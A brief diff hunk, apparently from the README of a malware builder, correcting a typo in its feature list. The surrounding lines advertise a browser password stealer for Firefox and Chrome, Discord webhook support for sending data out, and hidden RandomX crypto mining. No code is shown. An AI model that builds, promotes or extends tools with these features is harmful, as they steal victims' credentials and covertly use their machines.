@@ -103,7 +103,7 @@ To Compile, launch this and fill out the form :
 
 💚 Browser Password Stealer (Firefox/Chrome/Chromium)
 
-💚 Discord Webhook suppor
+💚 Discord Webhook support
 
 💚 Hidden Crypto mining (RandomX) (Use TRX for best performances.)
 
